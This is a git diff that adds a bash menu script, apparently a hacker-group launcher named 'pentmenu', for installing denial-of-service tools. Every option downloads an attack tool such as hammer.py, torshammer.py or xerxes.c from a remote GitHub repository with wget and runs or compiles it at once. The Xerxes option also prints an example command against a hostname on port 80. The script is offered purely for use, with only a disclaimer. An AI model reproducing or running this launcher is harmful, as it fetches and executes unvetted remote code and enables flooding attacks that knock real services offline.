@@ -1,0 +1,71 @@
+#!/bin/bash
+#set the prompt to show you are in pentmenu and not standard shell
+PS3="Pentmenu>"
+
+##MAINMENU##
+##################
+##START MAINMENU##
+mainmenu()
+{
+mainmenu=("DOS Hammer" "DOS Torshammer" "DOS Anonymous.pl" "DOS PnT" "DOS Mr A" "DOS AXE" "Xerxes" "Quit")
+select opt in "${mainmenu[@]}"; do
+	if [ "$opt" = "Quit" ]; then
+	echo "Quitting...Thank you for using pentmenu!" && sleep 1 && clear
+	exit 0
+	elif [ "$opt" = "DOS Hammer" ]; then
+apt -y install python
+ wget https://raw.githubusercontent.com/maellambong/DDos/master/tool/hammer.py
+   python hammer.py
+     echo " "
+	elif [ "$opt" = "DOS Torshammer" ]; then
+apt install python2 -y
+ wget  https://raw.githubusercontent.com/maellambong/DDos/master/tool/torshammer.py
+   python2 torshammer.py
+echo ""
+    elif [ "$opt" = "DOS Anonymous.pl" ]; then
+apt install perl
+	wget https://raw.githubusercontent.com/maellambong/DDos/master/perl/Anonymous.pl
+	perl Anonymous.pl
+echo " "
+ elif [ "$opt" = "DOS PnT" ]; then
+ apt install python2 -y 
+wget https://raw.githubusercontent.com/maellambong/DDos/master/tool/pnt.py
+python2 pnt.py
+echo " "
+elif [ "$opt" = "DOS Mr A" ]; then
+apt install python2 -y
+	  wget https://raw.githubusercontent.com/maellambong/DDos/master/MR.A
+	python2 MR.A
+echo " "
+elif [ "$opt" = "DOS AXE" ]; then
+apt install python2 -y
+	wget https://raw.githubusercontent.com/maellambong/DDos/master/tool/ddos2.py
+	python2 ddos2.py 
+echo " "
+  	elif [ "$opt" = "Xerxes" ]; then
+apt install clang -y 
+	wget https://raw.githubusercontent.com/maellambong/DDos/master/xerxes.c
+	clang xerxes.c -o xerxes
+	echo " example ./xerxes hostname 80"
+	else
+#if no valid option is chosen, chastise the user
+	echo "That's not a valid option! Hit Return to show main menu"
+	fi
+done
+}
+
+echo "Welcome to install DDOS!"
+echo "Created By MR A"
+echo "Malay Family Hacker."
+echo "YOU are responsible for your own actions!"
+echo ""
+mainmenu
+##END WELCOME MESSAGE##
+#######################
+##/WELCOME##
+
+	  
+	 
+
+	  
+	 
